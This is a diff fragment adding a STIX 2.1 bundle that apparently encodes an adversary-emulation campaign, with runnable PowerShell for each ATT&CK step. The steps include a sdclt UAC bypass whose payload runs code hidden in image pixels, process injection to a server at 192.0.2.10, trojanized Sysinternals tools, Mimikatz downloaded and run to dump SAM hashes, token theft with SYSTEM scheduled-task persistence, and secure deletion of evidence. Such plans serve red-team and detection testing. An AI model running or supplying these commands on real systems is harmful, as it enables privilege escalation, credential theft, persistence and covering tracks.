+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--99fef753-b8b0-45d8-a03a-5575a3fe9ff2",
+            "created": "2024-02-03T15:12:49.135028Z",
+            "modified": "2024-02-03T15:12:49.135028Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--1345bff7-6f26-43b2-a92a-9aabccdb3db0"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--89e9dffa-8836-4672-8cf3-bebd006d2a2b",
+            "created": "2024-02-03T15:12:49.13525Z",
+            "modified": "2024-02-03T15:12:49.13525Z",
+            "name": "UAC Bypass via Backup Utility",
+            "description": "Modify registry values of sdclt to bypass UAC",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1548.002",
+                    "input_arguments": {
+                        "profile_user": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (!(test-path -path $env:windir\\system32\\sdclt.exe)) {\n  write-host \"[!] sdclt.exe was not found on this host.\";\n  exit 1;\n}\nNew-Item -Path HKCU:\\Software\\Classes -Name Folder -Force;\nNew-Item -Path HKCU:\\Software\\Classes\\Folder -Name shell -Force;\nNew-Item -Path HKCU:\\Software\\Classes\\Folder\\shell -Name open -Force;\nNew-Item -Path HKCU:\\Software\\Classes\\Folder\\shell\\open -Name command -Force;\n\n$username=\"#{profile_user}\";\n$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName \"System.Drawing\"; $g=a System.Drawing.Bitmap(\"C:\\Users\\$($username)\\Downloads\\monkey.png\");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))\"';\n\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"(Default)\" -Value $payload -Force;\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force;\n\ncmd.exe /c sdclt.exe;\ncmd.exe /c powershell.exe;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e0c1b740-7d40-4df3-b38e-caf64c4e48b1",
+            "created": "2024-02-03T15:12:49.135785Z",
+            "modified": "2024-02-03T15:12:49.135785Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--89e9dffa-8836-4672-8cf3-bebd006d2a2b",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f0603d7d-9a07-4f38-8c97-16057bb91487",
+            "created": "2024-02-03T15:12:49.136029Z",
+            "modified": "2024-02-03T15:12:49.136029Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--89e9dffa-8836-4672-8cf3-bebd006d2a2b"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5ff80022-8d85-410b-b868-6c7565b267e5",
+            "created": "2024-02-03T15:12:49.136261Z",
+            "modified": "2024-02-03T15:12:49.136261Z",
+            "name": "Registry Cleanup for UAC Bypass Technique",
+            "description": "Delete registry entries post-UAC bypass.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1112",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Remove-Item -Path HKCU:\\Software\\Classes\\Folder* -Recurse -Force;\nif (!(test-path -path HKCU:\\Software\\Classes\\Folder)) {\n  write-host \"[+] Reg keys removed!\";\n }\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Modify Registry"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e8355701-ea6b-4ae4-950c-ae501814e02d",
+            "created": "2024-02-03T15:12:49.136598Z",
+            "modified": "2024-02-03T15:12:49.136598Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--5ff80022-8d85-410b-b868-6c7565b267e5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--088b8639-3f37-42cc-9dc8-01aabb645461",
+            "created": "2024-02-03T15:12:49.136854Z",
+            "modified": "2024-02-03T15:12:49.136854Z",
+            "name": "Process Injection",
+            "description": "The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1055",
+                    "input_arguments": {
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\Invoke-PSInject.ps1 -Verbose -Force;\nMove-Item -Path .\\update.ps1 -Destination $env:APPDATA -Force;\n$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"Import-Module $env:APPDATA\\update.ps1;update('#{server}')\"));\nInject -PoshCode $pcode;\n",
+                                "payloads": [
+                                    "update.ps1",
+                                    "Invoke-PSInject.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Process Injection"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2ff2a4e0-caff-470b-b4e1-5fa4eb1ae91c",
+            "created": "2024-02-03T15:12:49.137521Z",
+            "modified": "2024-02-03T15:12:49.137521Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--088b8639-3f37-42cc-9dc8-01aabb645461",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d1a7d8f2-92b6-4460-bc17-b713e7c0fc07",
+            "created": "2024-02-03T15:12:49.137777Z",
+            "modified": "2024-02-03T15:12:49.137777Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--088b8639-3f37-42cc-9dc8-01aabb645461"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d",
+            "created": "2024-02-03T15:12:49.137986Z",
+            "modified": "2024-02-03T15:12:49.137986Z",
+            "name": "Planting Modified Sysinternals Utilities",
+            "description": "Uploading payloads masquerading as via modified SysInternalsSuite",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1036.005",
+                    "input_arguments": {
+                        "profile_user": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "iwr -uri \"https://download.sysinternals.com/files/SysinternalsSuite.zip\" -outfile SysInternalsSuite.zip;\nExpand-Archive -Path SysInternalsSuite.zip -DestinationPath \"C:\\Users\\#{profile_user}\\Downloads\\SysInternalsSuite\" -Force;\n\nif (! $?) {\n  write-host \"Error moving files to #{profile_user}\\Downloads\";\n  exit 1;\n}\n\nMove-Item Modified-SysInternalsSuite.zip \"C:\\Users\\#{profile_user}\\Downloads\" -Force;\nExpand-Archive -LiteralPath \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite.zip\" -DestinationPath \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\" -Force;\n\nif (! $?) {\n  write-host \"Error expanding files to #{profile_user}\\Downloads\";\n  exit 1;\n}\n\n$dir_exists=Test-Path -path \"C:\\Program Files\\SysInternalsSuite\";\nif ($dir_exists -eq $true) {\n  write-host \"[*] SysInternalsSuite folder exists within \\\"C:\\Program Files\\\", copying over payloads then removing folder from Downloads.\";\n  Move-Item -path \"C:\\Users\\#{profile_user}\\Downloads\\SysInternalsSuite\\\\*\" -Destination \"C:\\Program Files\\SysInternalsSuite\\\\\" -Force;\n  Move-Item -path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\\\\*\" -Destination \"C:\\Program Files\\SysInternalsSuite\\\\\" -Force;\n} else {\n  mkdir \"C:\\Program Files\\SysInternalsSuite\";\n  Copy-Item -Path \"C:\\Users\\#{profile_user}\\Downloads\\SysInternalsSuite\\\\*\" -Destination \"C:\\Program Files\\SysInternalsSuite\\\\\" -Force;\n  Copy-Item -Path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\\\\*\" -Destination \"C:\\Program Files\\SysInternalsSuite\\\\\" -Force;\n}\n\nif (test-path -path \"SysInternalsSuite.zip\") {\n  Remove-Item -path \"filesystem::SysInternalsSuite.zip\" -force;\n}\n\nif (test-path -path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite.zip\" ) {\n  remove-item -path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite.zip\" -force;\n}\n\nif (test-path -path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\") {\n  remove-item -path \"C:\\Users\\#{profile_user}\\Downloads\\Modified-SysInternalsSuite\" -recurse -force;\n}\n\nif (test-path -path \"C:\\Users\\#{profile_user}\\Downloads\\SysInternalsSuite\") {\n  Remove-Item -path  \"C:\\Users\\#{profile_user}\\Downloads\\SysInternalsSuite\" -recurse -force;\n}\n\nSet-Location -path \"C:\\Program Files\\SysInternalsSuite\";\nif ($?) {\n  gci;\n  write-host \"[*] Successfully planted files\"\n} else {\n  write-host \"[!] Error downloading and planting modified system tools.\"\n}\n",
+                                "payloads": [
+                                    "Modified-SysInternalsSuite.zip"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Masquerading: Match Legitimate Name or Location"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a36d0ba2-2aaf-4c88-b648-5089c4e48028",
+            "created": "2024-02-03T15:12:49.158098Z",
+            "modified": "2024-02-03T15:12:49.158098Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e22d74e2-65e5-4b32-9814-b548dc33d77a",
+            "created": "2024-02-03T15:12:49.158885Z",
+            "modified": "2024-02-03T15:12:49.158885Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--59592c35-8207-4896-8d8b-36ad4600245d",
+            "created": "2024-02-03T15:12:49.159334Z",
+            "modified": "2024-02-03T15:12:49.159334Z",
+            "name": "Remote System Discovery",
+            "description": "The net utility is executed via cmd to enumerate DCs within the domain",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1018",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "cmd.exe /c net group \"Domain Controllers\" /domain\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote System Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--722ad9c8-632b-4e25-8437-3f045f1ed24e",
+            "created": "2024-02-03T15:12:49.159664Z",
+            "modified": "2024-02-03T15:12:49.159664Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--59592c35-8207-4896-8d8b-36ad4600245d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--24ed020e-4730-4000-b6b4-6b5d3e95314f",
+            "created": "2024-02-03T15:12:49.160251Z",
+            "modified": "2024-02-03T15:12:49.160251Z",
+            "name": "Remote System Discovery",
+            "description": "The net utility is executed via cmd to enumerate hosts within the domain.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1018",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "cmd.exe /c net group \"Domain Computers\" /domain\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote System Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--01c318a8-8590-49b0-b344-7a9b8d6c5d65",
+            "created": "2024-02-03T15:12:49.160623Z",
+            "modified": "2024-02-03T15:12:49.160623Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--24ed020e-4730-4000-b6b4-6b5d3e95314f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5f4263c4-7ff1-4098-b5f5-f41faa31cf5b",
+            "created": "2024-02-03T15:12:49.161231Z",
+            "modified": "2024-02-03T15:12:49.161231Z",
+            "name": "System Network Configuration Discovery",
+            "description": "The netsh utility is executed via cmd to enumerate local firewall configuration information.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1016",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "netsh advfirewall show allprofiles\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Configuration Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5af47327-1747-4443-af35-65dc24ff23bc",
+            "created": "2024-02-03T15:12:49.161667Z",
+            "modified": "2024-02-03T15:12:49.161667Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--5f4263c4-7ff1-4098-b5f5-f41faa31cf5b"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--646be6c9-f27a-4f5f-be5d-b8a0317e215f",
+            "created": "2024-02-03T15:12:49.162063Z",
+            "modified": "2024-02-03T15:12:49.162063Z",
+            "name": "Process Discovery",
+            "description": "List running process on the machine via PowerShell.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1057",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "$ps = get-process;\nwrite-output $ps;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Process Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e6ba15ef-dfda-45e7-a6c1-ba2ed1f93072",
+            "created": "2024-02-03T15:12:49.16238Z",
+            "modified": "2024-02-03T15:12:49.16238Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--646be6c9-f27a-4f5f-be5d-b8a0317e215f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--9b5b5aec-32ff-4d74-8555-727b50ab15f6",
+            "created": "2024-02-03T15:12:49.162724Z",
+            "modified": "2024-02-03T15:12:49.162724Z",
+            "name": "Artifact Cleanup - Delete Files",
+            "description": "Cleanup files related to Operation",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1070.004",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (! $(test-path -path \"C:\\Program Files\\SysInternalsSuite\";)) {\n  write-host \"[!] The path C:\\Program Files\\SysInternalsSuite does not exist. Execution has stopped.\";\n  exit 1;\n}\nSet-Location -path \"C:\\Program Files\\SysInternalsSuite\";\ngci $env:userprofile\\Desktop;\n.\\sdelete64.exe /accepteula \"$env:USERPROFILE\\Desktop\\\u202ecod.3aka3.scr\";\n.\\sdelete64.exe /accepteula \"$env:APPDATA\\Draft.Zip\";\n.\\sdelete64.exe /accepteula \"$env:USERPROFILE\\Downloads\\SysInternalsSuite.zip\";\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Indicator Removal on Host: File Deletion"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1ef13866-417d-4bc8-b872-0230d1e863aa",
+            "created": "2024-02-03T15:12:49.163201Z",
+            "modified": "2024-02-03T15:12:49.163201Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--9b5b5aec-32ff-4d74-8555-727b50ab15f6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--6f1f4768-7099-45d2-a858-b49dc792234e",
+            "created": "2024-02-03T15:12:49.163744Z",
+            "modified": "2024-02-03T15:12:49.163744Z",
+            "name": "Loading Stage-2 & Performing Discovery",
+            "description": "Load Stage-2 from Modified Sysinternals Toolset",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (! $(test-path -path \"C:\\Program Files\\SysInternalsSuite\")) {\n  write-host \"[!] The path C:\\Program Files\\SysInternalsSuite does not exist. Execution has stopped.\";\n  exit 1;\n}\n\nSet-Location -path \"C:\\Program Files\\SysInternalsSuite\";\nif (!(test-path \".\\readme.ps1\")) {\n  Move-Item .\\readme.txt readme.ps1 -Force;\n}\n. .\\readme.ps1;\nInvoke-Discovery;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cfbe420f-11f1-466d-9cbe-a51ed0b7d488",
+            "created": "2024-02-03T15:12:49.164143Z",
+            "modified": "2024-02-03T15:12:49.164143Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--6f1f4768-7099-45d2-a858-b49dc792234e"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ba0b398d-91b8-490a-bed2-f959afa8e1aa",
+            "created": "2024-02-03T15:12:49.164487Z",
+            "modified": "2024-02-03T15:12:49.164487Z",
+            "name": "4.C.2 - System Network Connections Discovery (T1049)",
+            "description": "The netstat utility is executed via cmd to enumerate local active network connections.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1049",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "netstat -ano\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Connections Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--30b712af-7615-4837-8b68-0c7470642ee4",
+            "created": "2024-02-03T15:12:49.165045Z",
+            "modified": "2024-02-03T15:12:49.165045Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--ba0b398d-91b8-490a-bed2-f959afa8e1aa"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--effbedc1-1bc8-4a75-9395-980559700008",
+            "created": "2024-02-03T15:12:49.165427Z",
+            "modified": "2024-02-03T15:12:49.165427Z",
+            "name": "Credential Dumping using Process Injection",
+            "description": "Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1003",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\");\niex $result;\nfunction hashdump\n{\n    Invoke-Mimikatz -Command \"privilege::debug token::elevate lsadump::sam exit\"\n};\nhashdump;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Credential Dumping"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b3c94d8d-54b0-4bcb-9283-78b01da77957",
+            "created": "2024-02-03T15:12:49.166166Z",
+            "modified": "2024-02-03T15:12:49.166166Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--effbedc1-1bc8-4a75-9395-980559700008"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--9c75155e-21ab-4471-af16-45f3795a313c",
+            "created": "2024-02-03T15:12:49.166578Z",
+            "modified": "2024-02-03T15:12:49.166578Z",
+            "name": "Persistent Service 1",
+            "description": "Leverage modified Sysinternals",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1547.009",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Set-Location -path \"C:\\Program Files\\SysinternalsSuite\";\nif (get-service -name \"javamtsup\" -ErrorAction SilentlyContinue) {\n  write-host \"[*] Service already exists...Not running persistence step-1\";\n  exit 1;\n}\n\nif (Test-Path -path \"readme.ps1\") {\n  . .\\readme.ps1;\n  Invoke-Persistence -PersistStep 1;\n  write-host \"[+] Persistence 1 invoked.\";\n  exit 0;\n\n} else {\n  write-host \"[!] readme.ps1 not found.\";\n  exit 1;\n}\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ce095d07-c4b7-48cc-8205-094e2fbae0fe",
+            "created": "2024-02-03T15:12:49.166856Z",
+            "modified": "2024-02-03T15:12:49.166856Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--9c75155e-21ab-4471-af16-45f3795a313c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--45f18b58-c14f-4b61-a3da-41b67af21429",
+            "created": "2024-02-03T15:12:49.167214Z",
+            "modified": "2024-02-03T15:12:49.167214Z",
+            "name": "Persistent Service 2",
+            "description": "Leverage modified Sysinternals",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1547.009",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Set-Location -path \"C:\\Program Files\\SysinternalsSuite\";\nif (Test-Path -path \"readme.ps1\") {\n  . .\\readme.ps1;\n  Invoke-Persistence -PersistStep 2;\n  write-host \"[+] Persistence 2 invoked.\";\n\n} else {\n  write-host \"[!] readme.ps1 not found.\";\n  return 1;\n}\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d2d688ec-9959-4333-b3d5-9e614af3a859",
+            "created": "2024-02-03T15:12:49.167498Z",
+            "modified": "2024-02-03T15:12:49.167498Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--45f18b58-c14f-4b61-a3da-41b67af21429"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--03afada1-1714-408f-bde5-f528b91dc89d",
+            "created": "2024-02-03T15:12:49.167784Z",
+            "modified": "2024-02-03T15:12:49.167784Z",
+            "name": "Access Token Manipulation",
+            "description": "A token theft script was executed to steal and assume the token of another user\u2019s existing process, changing the user context of the process.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1134",
+                    "input_arguments": {
+                        "remote.file.share": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of remote file share",
+                            "type": "string"
+                        },
+                        "server": {
+                            "default": "127.0.0.1",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\StealToken.ps1 -Verbose -Force;\nStealToken;\nCreateProcessWithToken -CommandLine 'cmd.exe /c reg query \"\\\\#{remote.file.share}\\hklm\\system\\currentcontrolset\\control\\terminal server\"';\nCreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn \"Resume Viewer Update Checker\" /tr \".\\sandcat.exe #{server} evals\" /sc ONLOGON /RU SYSTEM';\nCreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';\nCreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';\nRevertToSelf;\n",
+                                "payloads": [
+                                    "StealToken.ps1",
+                                    "sandcat.go-windows"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Access Token Manipulation"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e7d9932d-0480-4f44-92a5-11cfb7a2d298",
+            "created": "2024-02-03T15:12:49.168373Z",
+            "modified": "2024-02-03T15:12:49.168373Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--03afada1-1714-408f-bde5-f528b91dc89d",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0d5238c6-dd59-4a1e-b660-6efc923a9c74",
+            "created": "2024-02-03T15:12:49.169017Z",
+            "modified": "2024-02-03T15:12:49.169017Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--03afada1-1714-408f-bde5-f528b91dc89d",
+            "target_ref": "ipv4-addr--679c6c82-b4be-52e2-9c7a-198689f6f77b"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--679c6c82-b4be-52e2-9c7a-198689f6f77b",
+            "value": "127.0.0.1"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--105941e1-2b37-42b7-a0bd-da061dc78750",
+            "created": "2024-02-03T15:12:49.169453Z",
+            "modified": "2024-02-03T15:12:49.169453Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--03afada1-1714-408f-bde5-f528b91dc89d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d",
+            "created": "2024-02-03T15:12:49.1698Z",
+            "modified": "2024-02-03T15:12:49.1698Z",
+            "name": "Credentials In Files- Chrome",
+            "description": "Obtain credentials from Chrome Dumper",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1003",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\")) {\n  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite does not exist. Execution has stopped.\";\n  exit 1;\n}\n\nSet-Location -path \"C:\\Program Files\\SysinternalsSuite\";\n./accesschk.exe -accepteula .;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Credential Dumping"
